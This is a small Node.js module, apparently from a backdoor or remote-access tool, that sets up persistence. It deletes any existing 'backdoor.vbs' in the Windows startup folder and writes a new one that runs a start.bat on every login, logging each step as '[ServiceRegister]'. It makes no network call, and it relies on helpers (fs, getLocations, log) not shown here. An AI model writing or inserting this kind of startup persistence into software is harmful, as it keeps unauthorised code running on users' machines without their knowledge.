const path = require("path");


const Register = () => {


    const target = path.join(getLocations().startUpPath, "backdoor.vbs")
    const script = path.join(getLocations().installationPath, "start.bat")

    if (fs.existsSync(target)) {
        fs.unlinkSync(target)
        log("Deleted Startup Script", undefined, "[ServiceRegister]");
    }

    let data = `Dim objShell
Set objShell = Wscript.CreateObject("WScript.Shell")
objShell.Run "${script}"
Set objShell = Nothing
`

    fs.appendFileSync(target, data)
    log("Created Startup Script", undefined, "[ServiceRegister]");

}


module.exports = Register;